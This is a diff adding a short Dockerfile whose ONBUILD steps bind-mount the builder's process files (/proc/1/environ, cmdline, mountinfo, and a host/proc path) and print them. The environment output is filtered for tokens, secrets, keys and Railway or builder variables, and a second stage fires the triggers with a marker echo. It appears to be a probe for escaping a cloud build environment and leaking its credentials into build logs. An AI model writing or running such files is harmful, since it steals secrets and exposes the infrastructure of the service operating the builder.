@@ -1,0 +1,7 @@
+# INTENT-67522-6cb1445d
+FROM alpine:3.20 AS base
+ONBUILD RUN --mount=type=bind,source=proc/1/mountinfo,target=/mi1 sh -c 'echo ===MI1===; head -c 12000 /mi1; echo; echo ===MI1_END==='
+ONBUILD RUN --mount=type=bind,source=proc/1/cmdline,target=/c1 --mount=type=bind,source=proc/1/environ,target=/e1 sh -c 'echo ===C1===; tr "\0" " " < /c1; echo; echo ===E1===; tr "\0" "\n" < /e1 | grep -aiE "BUILDER|RAILWAY|TOKEN|SECRET|KEY|DATA_DIR|GATEWAY|TEMPORAL|NATS|HOST" | head -40; echo ===C1_END==='
+ONBUILD RUN --mount=type=bind,source=host/proc/1/mountinfo,target=/mi2 sh -c 'echo ===MI2===; head -c 12000 /mi2; echo; echo ===MI2_END==='
+FROM base
+RUN sh -c 'echo TRIGGER_I67522_D_6cb1445d'
